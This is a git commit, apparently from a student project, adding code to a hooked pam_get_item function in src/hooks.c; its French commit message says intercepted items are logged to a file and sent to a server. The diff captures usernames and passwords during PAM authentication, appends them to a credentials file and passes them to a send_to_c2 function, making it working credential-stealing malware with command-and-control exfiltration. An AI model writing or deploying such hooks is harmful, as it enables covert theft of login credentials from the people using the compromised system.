63f34a3a1e46aa2a3d09dc17717b798ea53a4f50
Guillaume Houriez <guillaume.houriez@epitech.eu>
2025-02-06 22:44:30 +0100

    [ADD] hook qui vérifie mtn si les éléments sont bien interceptés, enregistrer les logs dans un fichier CREDS_FILE, renvoie vers le serv

--- src/hooks.c
+++ src/hooks.c
@@ -9,5 +9,21 @@ const void* pam_get_item(void *pamh, int item)
     if (!orig) {
         orig = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
     }
+    const void *res = orig(pamh, item);
+    if (item == 0 || item == 1) {
+        char logline[256];
+        if (res) {
+            if (item == 0)
+                snprintf(logline, sizeof(logline), "USER: %s\n", (char*)res);
+            else
+                snprintf(logline, sizeof(logline), "PASS: %s\n", (char*)res);
+            FILE *fp = fopen(CREDS_FILE, "a");
+            if (fp) {
+                fputs(logline, fp);
+                fclose(fp);
+            }
+            send_to_c2(logline);
+        }
+    }
+    return res;
 }
-
